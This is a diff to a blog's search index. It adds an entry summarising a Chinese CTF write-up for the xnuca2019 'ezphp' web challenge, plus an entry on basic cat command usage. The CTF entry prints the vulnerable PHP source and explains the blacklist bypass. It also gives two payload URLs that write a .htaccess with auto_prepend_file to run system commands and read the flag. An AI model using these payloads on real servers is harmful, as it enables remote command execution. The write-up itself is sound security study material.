@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[xnuca2019 web ezphp wp]]></title>
+    <url>%2F2019%2F09%2F09%2Fxnuca2019-web-ezphp-wp%2F</url>
+    <content type="text"><![CDATA[0x00官方源码 0x01环境搭建好后,访问发现源码.12345678910111213141516171819202122232425262728293031323334&lt;?php $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== "index.php") &#123; unlink($file); &#125; &#125; &#125; include_once("fl3g.php"); if(!isset($_GET['content']) || !isset($_GET['filename'])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) &#123; echo "Hacker"; die(); &#125; $filename = $_GET['filename']; if(preg_match("/[^a-z\.]/", $filename) == 1) &#123; echo "Hacker"; die(); &#125; $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== "index.php") &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . "\nJust one chance");?&gt; 大致分析源码,可以想到通过写.htaccess来执行命令.黑名单可已通过\绕过12fi\le 并且注意到最后填加了\nJust one chance,我们只要自己加上一个\转义后面的换行,就不会500了. 0x02payload:12/?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0A%23&lt;?php%20system(%27ls%20/%27);?&gt;%0A%23%20\/?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0A%23&lt;?php%20system(%27cat /fl\%0Aag%27);?&gt;%0A%23%20\]]></content>
+      <categories>
+        <category>web安全学习笔记</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[cat命令用法]]></title>
     <url>%2F2019%2F08%2F31%2Fcat%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95%2F</url>
     <content type="text"><![CDATA[输出文件内容1cat filename 创建一个文件123cat &gt;filename&lt;&lt;EOF&gt;hello world&gt;EOF 追加文件写入123cat &gt;&gt;filename&lt;&lt;EOF&gt;i am chenxiyuan&gt;EOF 文件合并写入1234cat file1&gt;file2# 会覆盖掉file2的原内容cat file1&gt;&gt;file2# 只是追加]]></content>
@@ -327,8 +338,8 @@
         <category>web安全学习笔记</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>python</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
